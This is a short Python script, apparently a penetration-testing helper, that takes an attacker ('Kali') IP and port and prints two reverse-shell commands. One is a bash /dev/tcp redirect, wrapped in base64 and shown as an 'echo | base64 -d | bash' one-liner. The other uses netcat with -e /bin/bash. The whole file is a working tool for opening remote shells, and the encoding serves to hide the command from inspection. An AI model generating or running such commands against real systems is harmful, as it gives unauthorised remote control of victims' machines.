#!/usr/bin/python3
import base64

def generate_reverse_shell():
    kali_ip = input("Enter Kali IP: ")
    port = input("Enter Port number: ")
    
    # Create the reverse shell command
    cmd1 = f"bash -i >& /dev/tcp/{kali_ip}/{port} 0>&1"
    cmd2 = f"nc -e /bin/bash {kali_ip} {port}"
    
    # Encode to base64
    encoded = base64.b64encode(cmd1.encode()).decode()
    
    print("\nBase64 encoded command:")
    print(encoded)
    print("\n1st command to use:")
    print(f'echo "{encoded}" | base64 -d | bash')
    print("\n2nd command to use:")
    print(cmd2)

if __name__ == "__main__":
    generate_reverse_shell()
    